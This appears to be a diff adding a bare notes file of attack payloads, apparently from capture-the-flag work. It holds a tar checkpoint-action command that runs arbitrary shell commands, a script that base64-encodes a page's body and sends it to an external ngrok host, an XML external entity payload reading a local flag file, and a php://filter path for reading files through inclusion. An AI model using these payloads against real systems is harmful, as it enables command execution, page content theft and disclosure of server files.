@@ -1,0 +1,22 @@
+tar
+cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="ls -l"
+
+<script>
+    document.location.href =
+        "https://3569-149-3-124-22.eu.ngrok.io/src=" +
+        btoa(document.getElementsByTagName("body")[0].innerHTML);
+</script>
+
+syntax-crawler
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY xxe SYSTEM
+"file:///var/www/html/flag">
+]>
+<foo>
+&xxe;
+</foo>
+
+"php://filter/convert.base64-encode/resource=/var/www/html/flag">
